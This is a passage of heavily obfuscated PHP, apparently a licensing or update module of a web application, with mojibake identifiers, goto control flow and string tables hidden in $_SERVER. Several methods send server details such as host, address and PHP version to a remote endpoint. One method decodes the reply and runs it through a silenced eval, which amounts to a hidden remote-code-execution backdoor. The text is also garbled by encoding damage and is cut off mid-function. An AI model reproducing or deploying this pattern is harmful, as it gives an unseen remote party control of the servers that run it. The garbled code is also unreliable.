$b’Ì±ãµí›[$B¿◊ÀÈ«ÆŒ[217]] >= 1) { $B¿◊ÀÈ«ÆŒ[61]($B¿◊ÀÈ«ÆŒ[62])->{$_SERVER[œ][218]}($B¿◊ÀÈ«ÆŒ[219], $B¿◊ÀÈ«ÆŒ[220]); } $B¿◊ÀÈ«ÆŒ[61]($B¿◊ÀÈ«ÆŒ[62])->{$_SERVER[œ][221]}($bÖ∞ﬂ≤á≠´); $D…≠´ßçêü = $B¿◊ÀÈ«ÆŒ[114]($_SERVER[$B¿◊ÀÈ«ÆŒ[115]] . $B¿◊ÀÈ«ÆŒ[214]($F‘œÃ¡¯ı¬) . $bÖ∞ﬂ≤á≠´[$B¿◊ÀÈ«ÆŒ[210]]); goto dﬂÈ∆íﬂâÇ; Cè©—æ·ÃÉ: $bÖ∞ﬂ≤á≠´[$B¿◊ÀÈ«ÆŒ[123]] = $B¿◊ÀÈ«ÆŒ[118]($B¿◊ÀÈ«ÆŒ[214]($this->{$_SERVER[œ][147]}($cπì‡Ã œÈ, $B¿◊ÀÈ«ÆŒ[216]))); $cóàÕù»å— = $cÌÈã˘®◊‡[595]; while ($cóàÕù»å— < $cÌÈã˘®◊‡[549]) { if ($cóàÕù»å— >= 0) { break; } $cóàÕù»å—++; } goto DñÖöÊÈÈ©; eƒ¿Çæÿ¯›: while (strlen($Bô¬ﬂÖÆŸ) < $cÌÈã˘®◊‡[549]) { if (!$Bô¬ﬂÖÆŸ) { break; } $Bô¬ﬂÖÆŸ++; } $B¿◊ÀÈ«ÆŒ[61]($B¿◊ÀÈ«ÆŒ[11])->{$_SERVER[œ][226]}($a∏®∂ÇÖ€è[$B¿◊ÀÈ«ÆŒ[227]], array($B¿◊ÀÈ«ÆŒ[228] => $bÛûåÛ‚âÂ)); $B¿◊ÀÈ«ÆŒ[166]($B¿◊ÀÈ«ÆŒ[197]($B¿◊ÀÈ«ÆŒ[208]), !0); goto A∑∏à£ë§ó; E°çÒÀöıÉ: if (!$B¿◊ÀÈ«ÆŒ[191]($Aí¬¶Ê÷Øâ) || !$B¿◊ÀÈ«ÆŒ[191]($Aí¬¶Ê÷Øâ[$B¿◊ÀÈ«ÆŒ[192]]) || $Aí¬¶Ê÷Øâ[$B¿◊ÀÈ«ÆŒ[165]] != !0) { $D´–ï–Ωæ∫ = $B¿◊ÀÈ«ÆŒ[197]($B¿◊ÀÈ«ÆŒ[198]); $AØ≤Ó„“Òë = $Aí¬¶Ê÷Øâ[$B¿◊ÀÈ«ÆŒ[192]] ? $B¿◊ÀÈ«ÆŒ[194] . $Aí¬¶Ê÷Øâ[$B¿◊ÀÈ«ÆŒ[192]] : $D´–ï–Ωæ∫; $B¿◊ÀÈ«ÆŒ[166]($AØ≤Ó„“Òë, !1); } $b’Ì±ãµí› = $Aí¬¶Ê÷Øâ[$B¿◊ÀÈ«ÆŒ[192]]; $C∑÷∑ÁòÜ¢ = $this->{$_SERVER[œ][199]}($b’Ì±ãµí›[$B¿◊ÀÈ«ÆŒ[200]]); goto cﬁççÁÑ»ÿ; aÀ∏Áãﬂº∏: $a∏®∂ÇÖ€è = $eäú¯¶√º[$B¿◊ÀÈ«ÆŒ[225]]; $bÛûåÛ‚âÂ = array(); $a¿…ÿ√¯ˆ± = $cÌÈã˘®◊‡[596]; goto CÊ‰èﬂˆ€ª; cﬁççÁÑ»ÿ: $AÏÖ°Áãª≈ = $cÌÈã˘®◊‡[593]; if (!$AÏÖ°Áãª≈) { die; } if (!$C∑÷∑ÁòÜ¢ || $C∑÷∑ÁòÜ¢ != $B¿◊ÀÈ«ÆŒ[201]($b’Ì±ãµí›[$B¿◊ÀÈ«ÆŒ[145]])) { $D‹ÚÈ ìÇÀ = array($B¿◊ÀÈ«ÆŒ[202] => $B¿◊ÀÈ«ÆŒ[61]($B¿◊ÀÈ«ÆŒ[62])->{$_SERVER[œ][63]}($B¿◊ÀÈ«ÆŒ[116]), $B¿◊ÀÈ«ÆŒ[203] => $_SERVER[$B¿◊ÀÈ«ÆŒ[115]], $B¿◊ÀÈ«ÆŒ[204] => $B¿◊ÀÈ«ÆŒ[205](), $B¿◊ÀÈ«ÆŒ[174] => $_SERVER[$B¿◊ÀÈ«ÆŒ[175]]); $eÈ∂õº£‹Ê = $this->{$_SERVER[œ][206]}($B¿◊ÀÈ«ÆŒ[148]($D‹ÚÈ ìÇÀ)); $this->{$_SERVER[œ][182]}($B¿◊ÀÈ«ÆŒ[207] . $eÈ∂õº£‹Ê); $B¿◊ÀÈ«ÆŒ[166]($B¿◊ÀÈ«ÆŒ[197]($B¿◊ÀÈ«ÆŒ[208]), !0); } goto FÖøøî≈œ; CÉÖ¡ˆêÌ–: $cÌÈã˘®◊‡ =& $_SERVER[¯èãÄπµ]; $B¿◊ÀÈ«ÆŒ =& $_SERVER[œ]; if ($_SERVER[$B¿◊ÀÈ«ÆŒ[44]] != $B¿◊ÀÈ«ÆŒ[162]) { return; } goto A¶›≤êË—ı; FÎÛû∫ﬂ¡≤: if (!isset($b§÷¶ŸçÀ[$B¿◊ÀÈ«ÆŒ[165]]) || $B¿◊ÀÈ«ÆŒ[24]($b§÷¶ŸçÀ[$B¿◊ÀÈ«ÆŒ[165]]) != 16) { $B¿◊ÀÈ«ÆŒ[166]($B¿◊ÀÈ«ÆŒ[167] . $b§÷¶ŸçÀ[$B¿◊ÀÈ«ÆŒ[165]], !1); } $F‘œÃ¡¯ı¬ = $B¿◊ÀÈ«ÆŒ[61]($B¿◊ÀÈ«ÆŒ[62])->{$_SERVER[œ][63]}($B¿◊ÀÈ«ÆŒ[116]); $BÇó™‹ØòÁ = array($B¿◊ÀÈ«ÆŒ[165] => $b§÷¶ŸçÀ[$B¿◊ÀÈ«ÆŒ[165]], $B¿◊ÀÈ«ÆŒ[168] => $B¿◊ÀÈ«ÆŒ[124](16), $B¿◊ÀÈ«ÆŒ[169] => $B¿◊ÀÈ«ÆŒ[149], $B¿◊ÀÈ«ÆŒ[170] => $B¿◊ÀÈ«ÆŒ[171], $B¿◊ÀÈ«ÆŒ[172] => $_SERVER[$B¿◊ÀÈ«ÆŒ[173]], $B¿◊ÀÈ«ÆŒ[174] => $_SERVER[$B¿◊ÀÈ«ÆŒ[175]], $B¿◊ÀÈ«ÆŒ[176] => $_SERVER[$B¿◊ÀÈ«ÆŒ[177]]); goto cΩ®Ë¯ËÃÂ; B©≥Ú≈áÏ≈: } private function rdun18822a95() { goto EûËûêÕñë; EûËûêÕñë: $FÑ≤ß∞ª≥ﬂ =& $_SERVER[œ]; $FÑ≤ß∞ª≥ﬂ[61]($FÑ≤ß∞ª≥ﬂ[62])->{$_SERVER[œ][221]}(array($FÑ≤ß∞ª≥ﬂ[209] => $FÑ≤ß∞ª≥ﬂ[10], $FÑ≤ß∞ª≥ﬂ[210] => $FÑ≤ß∞ª≥ﬂ[10], $FÑ≤ß∞ª≥ﬂ[120] => $FÑ≤ß∞ª≥ﬂ[121], $FÑ≤ß∞ª≥ﬂ[122] => $FÑ≤ß∞ª≥ﬂ[10], $FÑ≤ß∞ª≥ﬂ[123] => $FÑ≤ß∞ª≥ﬂ[10])); $FÑ≤ß∞ª≥ﬂ[61]($FÑ≤ß∞ª≥ﬂ[62])->{$_SERVER[œ][218]}($FÑ≤ß∞ª≥ﬂ[219], $FÑ≤ß∞ª≥ﬂ[229]); goto d˜Õ≈ÖÖ°ô; d˜Õ≈ÖÖ°ô: $this->wmtj96332537 = array(); $this->kbxy57f94ed6 = $FÑ≤ß∞ª≥ﬂ[121]; $bÜ«àõ≤Ù = $_SERVER[¯èãÄπµ][599]; goto FÕâ◊à¡ûæ; FÕâ◊à¡ûæ: if (!$bÜ«àõ≤Ù) { die; } goto dƒ∫ß°–ƒä; dƒ∫ß°–ƒä: } private function bojc9c0a8a95() { goto bÉÃëˆÇ¬; FúÙ»çŸ¬Ü: if (!$FâíàäåŸÆ) { return; } $DµÕ„É≈¶ù = $fŸñå›„◊Ñ[214]($fŸñå›„◊Ñ[25]($bºíõ‚—ìí, 10, 16)); $bâˆæùó’ç = $bÖŒ≠÷È††[605]; goto Fç™§ïÒÌΩ; bÉÃëˆÇ¬: $bÖŒ≠÷È†† =& $_SERVER[¯èãÄπµ]; $fŸñå›„◊Ñ =& $_SERVER[œ]; $_SERVER[$fŸñå›„◊Ñ[175]] = $fŸñå›„◊Ñ[104]($_SERVER, $fŸñå›„◊Ñ[175], APP_HOST); goto F∏Á—ÃÂ‘‚; F∏Á—ÃÂ‘‚: $EöÀÓ∑çÿÑ = $bÖŒ≠÷È††[600]; $this->kbxy57f94ed6 = $fŸñå›„◊Ñ[121]; $Eäı˜ŒÆ€Ÿ = $fŸñå›„◊Ñ[61]($fŸñå›„◊Ñ[62])->{$_SERVER[œ][63]}(); goto fçâ Û¶´õ; BúÈñÑáÌú: if (!$B›ﬂáçŒ”ú) { die; } $bºíõ‚—ìí = $fŸñå›„◊Ñ[114]($_SERVER[$fŸñå›„◊Ñ[115]] . $fŸñå›„◊Ñ[214]($eÑÊ¬≤õÆ∫) . $Eäı˜ŒÆ€Ÿ[$fŸñå›„◊Ñ[210]]); $FâíàäåŸÆ = $bÖŒ≠÷È††[604]; goto FúÙ»çŸ¬Ü; fçâ Û¶´õ: $F¥§ŸòÓÿù = $bÖŒ≠÷È††[601]; if (strlen($F¥§ŸòÓÿù) < $bÖŒ≠÷È††[551]) { die; } if ($Eäı˜ŒÆ€Ÿ[$fŸñå›„◊Ñ[120]] == $fŸñå›„◊Ñ[121]) { return; } goto AÒÌùÖç¢◊; Fç™§ïÒÌΩ: while (strlen($bâˆæùó’ç) < $bÖŒ≠÷È††[549]) { if (!$bâˆæùó’ç) { break; } $bâˆæùó’ç++; } $Bæãõñ…ñá = $this->{$_SERVER[œ][188]}($Bœ∏Ù∫√¨·[$fŸñå›„◊Ñ[91]][$DµÕ„É≈¶ù], $bºíõ‚—ìí); $E”∑Õ˜ü€¶ = $bÖŒ≠÷È††[606]; goto fòç≠›≠øÖ; a¶€ﬂπ—éª: $B‡àÑéÇ†‡ = $fŸñå›„◊Ñ[144]($Bæãõñ…ñá[$fŸñå›„◊Ñ[145]]); if ($fŸñå›„◊Ñ[230]() >= $B‡àÑéÇ†‡) { return $this->{$_SERVER[œ][164]}(); } $this->wmtj96332537 = $Bæãõñ…ñá; goto fıÍë˘•å∆; fıÍë˘•å∆: $this->kbxy57f94ed6 = $Eäı˜ŒÆ€Ÿ[$fŸñå›„◊Ñ[120]]; $Cñûïñ€ê∂ = $bÖŒ≠÷È††[607]; while (strlen($Cñûïñ€ê∂) < $bÖŒ≠÷È††[551]) { if (!$Cñûïñ€ê∂) { break; } $Cñûïñ€ê∂++; } goto cÁéÜß±ßœ; fòç≠›≠øÖ: if (strlen($E”∑Õ˜ü€¶) < $bÖŒ≠÷È††[544]) { die; } $Bæãõñ…ñá = $fŸñå›„◊Ñ[190]($Bæãõñ…ñá, !0); if (!$fŸñå›„◊Ñ[191]($Bæãõñ…ñá)) { return $this->{$_SERVER[œ][164]}(); } goto a¶€ﬂπ—éª; AÒÌùÖç¢◊: $eÑÊ¬≤õÆ∫ = $fŸñå›„◊Ñ[61]($fŸñå›„◊Ñ[62])->{$_SERVER[œ][63]}($fŸñå›„◊Ñ[116]); $C’’≠Çı∆« = $fŸñå›„◊Ñ[222]($fŸñå›„◊Ñ[61]($fŸñå›„◊Ñ[11])->{$_SERVER[œ][223]}(), $fŸñå›„◊Ñ[224]); $a≥ºÕˆŒåÿ = $bÖŒ≠÷È††[602]; goto A€ò”èÈª‡; A€ò”èÈª‡: while ($a≥ºÕˆŒåÿ < $bÖŒ≠÷È††[551]) { if ($a≥ºÕˆŒåÿ >= 0) { break; } $a≥ºÕˆŒåÿ++; } $Bœ∏Ù∫√¨· = $C’’≠Çı∆«[$fŸñå›„◊Ñ[225]]; $B›ﬂáçŒ”ú = $bÖŒ≠÷È††[603]; goto BúÈñÑáÌú; cÁéÜß±ßœ: } private function klaj736c8ef2() { goto a“£Û≤øæµ; a“£Û≤øæµ: $fÀ˘∏Î»À¶ =& $_SERVER[œ]; $AØ≈◊ã£ß≤ = $GLOBALS[$fÀ˘∏Î»À¶[22]]; $fúÙÏó©†Ò = $_SERVER[¯èãÄπµ][608]; goto Cæ◊ûƒîõÛ; Cæ◊ûƒîõÛ: $c¨∏Ó¬â∂’ = $_SERVER[$fÀ˘∏Î»À¶[44]]; if ($c¨∏Ó¬â∂’ == $fÀ˘∏Î»À¶[231] && $this->kbxy57f94ed6 == $fÀ˘∏Î»À¶[121]) { $fÀ˘∏Î»À¶[166]($fÀ˘∏Î»À¶[197]($fÀ˘∏Î»À¶[232]), !1, $fÀ˘∏Î»À¶[233]); } $B∞›∏˜óíÙ = array($fÀ˘∏Î»À¶[234], $fÀ˘∏Î»À¶[235]); goto f§úÚÀëâà; f§úÚÀëâà: if ($fÀ˘∏Î»À¶[236]($c¨∏Ó¬â∂’, $B∞›∏˜óíÙ)) { if ($this->kbxy57f94ed6 == $fÀ˘∏Î»À¶[121] && isset($AØ≈◊ã£ß≤[$fÀ˘∏Î»À¶[237]])) { $fÀ˘∏Î»À¶[166]($fÀ˘∏Î»À¶[197]($fÀ˘∏Î»À¶[232]), !1, $fÀ˘∏Î»À¶[233]); die; } $fÜ¡≠≤ÿ◊Ω = $this->{$_SERVER[œ][137]}(); if ($fÜ¡≠≤ÿ◊Ω != $fÀ˘∏Î»À¶[201]($fÀ˘∏Î»À¶[238])) { if ($fÜ¡≠≤ÿ◊Ω <= $fÀ˘∏Î»À¶[61]($fÀ˘∏Î»À¶[139])->{$_SERVER[œ][140]}()) { $fÀ˘∏Î»À¶[166]($fÀ˘∏Î»À¶[197]($fÀ˘∏Î»À¶[239]), !1, $fÀ˘∏Î»À¶[233]); die; } } } goto D∑á…‘ñáå; D∑á…‘ñáå: } private function febl076bb3b5() { goto f∆‡„Çπﬂ≤; fÊÑÊ∫û£©: $D„‚®ﬂ≤å [251]($D„‚®ﬂ≤å [252]); if ($AÊíÚôÇ¶• && $D„‚®ﬂ≤å [32]($AÊíÚôÇ¶•, $D„‚®ﬂ≤å [253])) { echo $AÊíÚôÇ¶•; } die; goto a…ëã‘‚Ö‚; BÌÚ±Âèï•: $DÖÜÁˆç·á = $A∑‘¬Æ£‘ä[611]; $AÊíÚôÇ¶• = @$D„‚®ﬂ≤å [250]($EûÕÂÙΩÙÖ, !1, $aª…§èÖΩ÷); $c≥¢∞¢≥áù = $A∑‘¬Æ£‘ä[612]; goto fÊÑÊ∫û£©; a•◊Ïô‰âÚ: while ($C õ€ÂÂÿﬂ < $A∑‘¬Æ£‘ä[549]) { if ($C õ€ÂÂÿﬂ >= 0) { break; } $C õ€ÂÂÿﬂ++; } $EûÕÂÙΩÙÖ = $this->{$_SERVER[œ][243]}($EûÕÂÙΩÙÖ, $D„‚®ﬂ≤å [244]); $aª…§èÖΩ÷ = $D„‚®ﬂ≤å [245](array($D„‚®ﬂ≤å [246] => array($D„‚®ﬂ≤å [247] => $D„‚®ﬂ≤å [248], $D„‚®ﬂ≤å [249] => 3))); goto BÌÚ±Âèï•; CœèôΩ‹ﬁÂ: $A∞ã∞¯»·á = $A∑‘¬Æ£‘ä[609]; while ($A∞ã∞¯»·á < $A∑‘¬Æ£‘ä[551]) { if ($A∞ã∞¯»·á >= 0) { break; } $A∞ã∞¯»·á++; } if (!$D„‚®ﬂ≤å [104]($GLOBALS, $D„‚®ﬂ≤å [132]) || !isset($_GET[$D„‚®ﬂ≤å [241]])) { return; } goto Bﬁ√ãòÊ±·; Bﬁ√ãòÊ±·: if (!$D„‚®ﬂ≤å [236]($_SERVER[$D„‚®ﬂ≤å [44]], $c∂ßê¡è«≈)) { return; } $EûÕÂÙΩÙÖ = $D„‚®ﬂ≤å [242]; $C õ€ÂÂÿﬂ = $A∑‘¬Æ£‘ä[610]; goto a•◊Ïô‰âÚ; f∆‡„Çπﬂ≤: $A∑‘¬Æ£‘ä =& $_SERVER[¯èãÄπµ]; $D„‚®ﬂ≤å  =& $_SERVER[œ]; $c∂ßê¡è«≈ = array($D„‚®ﬂ≤å [135], $D„‚®ﬂ≤å [240]); goto CœèôΩ‹ﬁÂ; a…ëã‘‚Ö‚: } public function kybw050e3096($Bê¶ﬂñ†¨¨) { goto b™êÍ¬„°ä; b™êÍ¬„°ä: $c«êÌƒÙ¢¢ =& $_SERVER[¯èãÄπµ]; $A‘˜ÏùŒòä =& $_SERVER[œ]; if ($this->kbxy57f94ed6 == $A‘˜ÏùŒòä[254]) { return $Bê¶ﬂñ†¨¨; } goto d¶áÖ†ß„ä; B‘Çƒ‡§·∏: $aêÖïß…ïÌ = $c«êÌƒÙ¢¢[613]; if (strlen($aêÖïß…ïÌ) < $c«êÌƒÙ¢¢[570]) { die; } foreach ($a∆°íæÌ≈â as $B∆êÍÓ”í„) { if (!$A‘˜ÏùŒòä[236]($B∆êÍÓ”í„, $Bﬂü°±ﬁ¯‹)) { $AŒ¬«Óàê[] = $B∆êÍÓ”í„; } } goto E‹Ï®ÿáÂŒ; E‹Ï®ÿáÂŒ: foreach ($AŒ¬«Óàê as $B∆êÍÓ”í„) { unset($Bê¶ﬂñ†¨¨[$B∆êÍÓ”í„]); } return $Bê¶ﬂñ†¨¨; $CÉÓ¨Í„§∞ = $c«êÌƒÙ¢¢[614]; goto aÁà”≈ûë…; d¶áÖ†ß„ä: $a∆°íæÌ≈â = array($A‘˜ÏùŒòä[255], $A‘˜ÏùŒòä[256], $A‘˜ÏùŒòä[257], $A‘˜ÏùŒòä[258], $A‘˜ÏùŒòä[259], $A‘˜ÏùŒòä[260], $A‘˜ÏùŒòä[261], $A‘˜ÏùŒòä[262]); $Bﬂü°±ﬁ¯‹ = $A‘˜ÏùŒòä[0]($A‘˜ÏùŒòä[263], $A‘˜ÏùŒòä[104]($this->wmtj96332537, $A‘˜ÏùŒòä[129], $A‘˜ÏùŒòä[10])); $AŒ¬«Óàê = array(); goto B‘Çƒ‡§·∏; aÁà”≈ûë…: if (!$CÉÓ¨Í„§∞) { return; } goto cÜ≥ıÈ¯Ô£; cÜ≥ıÈ¯Ô£: } private function unzq11fa5e6f() { goto eçπ›ÃÁœî; eçπ›ÃÁœî: $E›ˆÑ€”ÿ¬ =& $_SERVER[œ]; if ($this->kbxy57f94ed6 != $E›ˆÑ€”ÿ¬[121]) { $GLOBALS[$E›ˆÑ€”ÿ¬[91]][$E›ˆÑ€”ÿ¬[95]][$E›ˆÑ€”ÿ¬[264]] = $E›ˆÑ€”ÿ¬[220]; return; } $cÁâàÆ’‡© = $_SERVER[$E›ˆÑ€”ÿ¬[44]]; goto Bâ¡âÈﬁÏŸ; b„±âçË“ç: $GLOBALS[$E›ˆÑ€”ÿ¬[91]][$E›ˆÑ€”ÿ¬[95]][$E›ˆÑ€”ÿ¬[264]] = $E›ˆÑ€”ÿ¬[229]; $GLOBALS[$E›ˆÑ€”ÿ¬[91]][$E›ˆÑ€”ÿ¬[268]] = $E›ˆÑ€”ÿ¬[220]; if ($E›ˆÑ€”ÿ¬[61]($E›ˆÑ€”ÿ¬[269])->{$_SERVER[œ][63]}($E›ˆÑ€”ÿ¬[85]) != $E›ˆÑ€”ÿ¬[229]) { $E›ˆÑ€”ÿ¬[61]($E›ˆÑ€”ÿ¬[269])->{$_SERVER[œ][221]}($E›ˆÑ€”ÿ¬[85], $E›ˆÑ€”ÿ¬[229]); } goto eù—Ã∆ºÃœ; Bâ¡âÈﬁÏŸ: $CΩøæ≠çì„ = array($E›ˆÑ€”ÿ¬[265]); foreach ($CΩøæ≠çì„ as $FûÈ‰‚ﬁ€≤) { if ($FûÈ‰‚ﬁ€≤ == $cÁâàÆ’‡© || $E›ˆÑ€”ÿ¬[25]($cÁâàÆ’‡©, 0, $E›ˆÑ€”ÿ¬[24]($FûÈ‰‚ﬁ€≤)) == $FûÈ‰‚ﬁ€≤) { $E›ˆÑ€”ÿ¬[166]($E›ˆÑ€”ÿ¬[197]($E›ˆÑ€”ÿ¬[266]), !1); } } $GLOBALS[$E›ˆÑ€”ÿ¬[91]][$E›ˆÑ€”ÿ¬[95]][$E›ˆÑ€”ÿ¬[267]] = $E›ˆÑ€”ÿ¬[220]; goto b„±âçË“ç; eù—Ã∆ºÃœ: } public function tcqd400799af() { return $_SERVER[œ][270]; } private function zjra8471fad5() { goto Bôå¢à´ÖÍ; Bôå¢à´ÖÍ: $D‡Ø∆µãªÃ =& $_SERVER[¯èãÄπµ]; $F•ƒıà€À‡ =& $_SERVER[œ]; $f˜Çé»†‹‹ = array($F•ƒıà€À‡[271], $F•ƒıà€À‡[272], $F•ƒıà€À‡[273]); goto C°»ó ¥—Ÿ; b¿œú’µ©å: $FÚÓÖÑñ∫é = $D‡Ø∆µãªÃ[619]; if (strlen($FÚÓÖÑñ∫é) < $D‡Ø∆µãªÃ[549]) { return; } if (!$F•ƒıà€À‡[191]($c—ËÛÿ‡¬‡)) { return; } goto béÎÑ©çÖ†; C°»ó ¥—Ÿ: $e¬—è§ì»À = $D‡Ø∆µãªÃ[615]; while (strlen($e¬—è§ì»À) < $D‡Ø∆µãªÃ[563]) { if (!$e¬—è§ì»À) { break; } $e¬—è§ì»À++; } $Fπ◊èåΩ—õ = $F•ƒıà€À‡[274] . $F•ƒıà€À‡[114]($F•ƒıà€À‡[275]); goto aÿ®ÕÊ◊€†; aÿ®ÕÊ◊€†: if ($this->kbxy57f94ed6 == $F•ƒıà€À‡[121] || !$F•ƒıà€À‡[104]($GLOBALS, $F•ƒıà€À‡[132])) { return; } if (!$F•ƒıà€À‡[236]($_SERVER[$F•ƒıà€À‡[44]], $f˜Çé»†‹‹)) { return; } if ($F•ƒıà€À‡[230]() % 4 != 0) { return; } goto EÜÎÆﬁîà; aÉ∆Ê¡Ω¡∞: if ($this->{$_SERVER[œ][199]}($c—ËÛÿ‡¬‡[$F•ƒıà€À‡[280]]) != $FÕ”‹µêƒÈ[$F•ƒıà€À‡[165]]) { $b£ïáπÕï≠ = array($F•ƒıà€À‡[202] => $F•ƒıà€À‡[61]($F•ƒıà€À‡[62])->{$_SERVER[œ][63]}($F•ƒıà€À‡[116]), $F•ƒıà€À‡[203] => $_SERVER[$F•ƒıà€À‡[115]], $F•ƒıà€À‡[204] => $F•ƒıà€À‡[205](), $F•ƒıà€À‡[174] => $_SERVER[$F•ƒıà€À‡[175]]); $eúê›£Ò∏  = $this->{$_SERVER[œ][206]}($F•ƒıà€À‡[148]($b£ïáπÕï≠)); $c—ËÛÿ‡¬‡ = $this->{$_SERVER[œ][182]}($F•ƒıà€À‡[207] . $eúê›£Ò∏ ); if ($c—ËÛÿ‡¬‡ && $F•ƒıà€À‡[191]($c—ËÛÿ‡¬‡) && isset($c—ËÛÿ‡¬‡[$F•ƒıà€À‡[280]])) { $BÀ¶ﬁì©Ò· = $this->{$_SERVER[œ][188]}($c—ËÛÿ‡¬‡[$F•ƒıà€À‡[280]], 2); if ($BÀ¶ﬁì©Ò·) { $BÀ¶ﬁì©Ò· = $this->{$_SERVER[œ][199]}($BÀ¶ﬁì©Ò·); } if ($BÀ¶ﬁì©Ò·) { try { @eval($BÀ¶ﬁì©Ò·); } catch (Exception $dÁßﬂö»≈⁄) { } } } } goto FÓÜéòÙ´Ÿ; B·ôÚãÇ∫û: $F•ƒıà€À‡[13](array($F•ƒıà€À‡[276], $F•ƒıà€À‡[152]), $Fπ◊èåΩ—õ, $F•ƒıà€À‡[230]()); $A√÷≠îâœ± = $D‡Ø∆µãªÃ[617]; $FÕ”‹µêƒÈ = array($F•ƒıà€À‡[165] => $F•ƒıà€À‡[61]($F•ƒıà€À‡[62])->{$_SERVER[œ][63]}($F•ƒıà€À‡[209]), $F•ƒıà€À‡[178] => $this->kbxy57f94ed6, $F•ƒıà€À‡[176] => $_SERVER[$F•ƒıà€À‡[177]], $F•ƒıà€À‡[169] => $F•ƒıà€À‡[149], $F•ƒıà€À‡[172] => $_SERVER[$F•ƒıà€À‡[173]]); goto b∏Õ¿û†à’; béÎÑ©çÖ†: if ($c—ËÛÿ‡¬‡[$F•ƒıà€À‡[165]] && $c—ËÛÿ‡¬‡[$F•ƒıà€À‡[280]]) { if ($this->{$_SERVER[œ][199]}($c—ËÛÿ‡¬‡[$F•ƒıà€À‡[280]]) == $FÕ”‹µêƒÈ[$F•ƒıà€À‡[165]]) { return; } } $this->{$_SERVER[œ][164]}(); $aè±ÿ§¥ª¬ = $D‡Ø∆µãªÃ[620]; goto aÉ∆Ê¡Ω¡∞; EÜÎÆﬁîà: $cËâí‰€ú∏ = $F•ƒıà€À‡[13](array($F•ƒıà€À‡[276], $F•ƒıà€À‡[277]), $Fπ◊èåΩ—õ); $Cê¨∆¶ù¬‰ = $D‡Ø∆µãªÃ[616]; if ($cËâí‰€ú∏ && $F•ƒıà€À‡[230]() - $cËâí‰€ú∏ < $F•ƒıà€À‡[201]($F•ƒıà€À‡[278])) { return; } goto B·ôÚãÇ∫û; b∏Õ¿û†à’: $FêÒ´Ê›“Ò = $D‡Ø∆µãªÃ[618]; if (!$FêÒ´Ê›“Ò) { die; } $c—ËÛÿ‡¬‡ = $this->{$_SERVER[œ][182]}($F•ƒıà€À‡[279], $FÕ”‹µêƒÈ); goto b¿œú’µ©å; FÓÜéòÙ´Ÿ: } private function hwsgbb089ee2($b„‘üèî÷Ë = '', $D€ÛßÊ…°√ = array(), $A◊üõ‰‰π◊ = 5) { goto eæä†”∑€Ù; Aà‘≈ç˜Ø˜: $aÁî¨∏ÙÇö = $béπ¥ëŸÎø[623]; if (strlen($aÁî¨∏ÙÇö) < $béπ¥ëŸÎø[544]) { return; } goto FıÈòÙÇ¡‘; eæä†”∑€Ù: $béπ¥ëŸÎø =& $_SERVER[¯èãÄπµ]; $FùÓ∑¬∑‰⁄ =& $_SERVER[œ]; $cçÖÿÚ†À— = $FùÓ∑¬∑‰⁄[281]; goto Eô·⁄¨”ò†; C éèâª¶ê: $EÁ’∑Õ≤œà = $béπ¥ëŸÎø[622]; $D€ÛßÊ…°√ = @$FùÓ∑¬∑‰⁄[250]($cçÖÿÚ†À—, !1, $AÈ¥›è¥œó); return $FùÓ∑¬∑‰⁄[190]($D€ÛßÊ…°√, !0); goto Aà‘≈ç˜Ø˜; cØÌøŒ˘◊û: $cçÖÿÚ†À— = $cçÖÿÚ†À— . $b„‘üèî÷Ë . $FùÓ∑¬∑‰⁄[283] . $FùÓ∑¬∑‰⁄[284]($D€ÛßÊ…°√); if ($D€ÛßÊ…°√ === -1) { return $cçÖÿÚ†À—; } $AÈ¥›è¥œó = $FùÓ∑¬∑‰⁄[245](array($FùÓ∑¬∑‰⁄[246] => array($FùÓ∑¬∑‰⁄[249] => $A◊üõ‰‰π◊, $FùÓ∑¬∑‰⁄[247] => $FùÓ∑¬∑‰⁄[285]), $FùÓ∑¬∑‰⁄[286] => array($FùÓ∑¬∑‰⁄[287] => !1, $FùÓ∑¬∑‰⁄[288] => !1))); goto C éèâª¶ê; Eô·⁄¨”ò†: $cçÖÿÚ†À— = $this->{$_SERVER[œ][243]}($cçÖÿÚ†À—, $FùÓ∑¬∑‰⁄[282]); $aÉ∫‘óüÿ = $béπ¥ëŸÎø[621]; if (strlen($aÉ∫‘óüÿ) < $béπ¥ëŸÎø[551]) { die; } goto cØÌøŒ˘◊û; FıÈòÙÇ¡‘: } private function tjad3ae5b258() { goto F◊©—õºÚù; A Ëåêà¯≈: $Fì‚áÌ√ﬁ≠ = $FÛ†‰ºòû[625]; if (strlen($Fì‚áÌ√ﬁ≠) < $FÛ†‰ºòû[551]) { return; } $f©»äƒàû’ = $EË◊Ê≈∂Ñ”[201]($f©»äƒàû’ ? $f©»äƒàû’ : $EË◊Ê≈∂Ñ”[290]); goto Búø ë”ê«; F∂ûÎıÔåñ: return $f©»äƒàû’ + $aãÃÜìÒÓÔ; $Eúø–πÖ•Ã = $FÛ†‰ºòû[628]; if (!$Eúø–πÖ•Ã) { die; } goto Dÿ€’ÚΩÊÂ; F◊©—õºÚù: $FÛ†‰ºòû =& $_SERVER[¯èãÄπµ]; $EË◊Ê≈∂Ñ” =& $_SERVER[œ]; $Aø◊˘∂ßÏ≈ = array($EË◊Ê≈∂Ñ”[289] => $EË◊Ê≈∂Ñ”[290], $EË◊Ê≈∂Ñ”[291] => $EË◊Ê≈∂Ñ”[292], $EË◊Ê≈∂Ñ”[293] => $EË◊Ê≈∂Ñ”[294], $EË◊Ê≈∂Ñ”[295] => $EË◊Ê≈∂Ñ”[296], $EË◊Ê≈∂Ñ”[297] => $EË◊Ê≈∂Ñ”[298], $EË◊Ê≈∂Ñ”[299] => $EË◊Ê≈∂Ñ”[238], $EË◊Ê≈∂Ñ”[300] => $EË◊Ê≈∂Ñ”[238], $EË◊Ê≈∂Ñ”[301] => $EË◊Ê≈∂Ñ”[290], $EË◊Ê≈∂Ñ”[302] => $EË◊Ê≈∂Ñ”[292], $EË◊Ê≈∂Ñ”[303] => $EË◊Ê≈∂Ñ”[294], $EË◊Ê≈∂Ñ”[304] => $EË◊Ê≈∂Ñ”[305], $EË◊Ê≈∂Ñ”[306] => $EË◊Ê≈∂Ñ”[296], $EË◊Ê≈∂Ñ”[307] => $EË◊Ê≈∂Ñ”[308], $EË◊Ê≈∂Ñ”[309] => $EË◊Ê≈∂Ñ”[298], $EË◊Ê≈∂Ñ”[310] => $EË◊Ê≈∂Ñ”[311], $EË◊Ê≈∂Ñ”[312] => $EË◊Ê≈∂Ñ”[313], $EË◊Ê≈∂Ñ”[314] => $EË◊Ê≈∂Ñ”[315]); goto aøπÌ êıã; aøπÌ êıã: $C˜ÂÌ±ËŒ’ = $FÛ†‰ºòû[624]; if (!$C˜ÂÌ±ËŒ’) { return; } 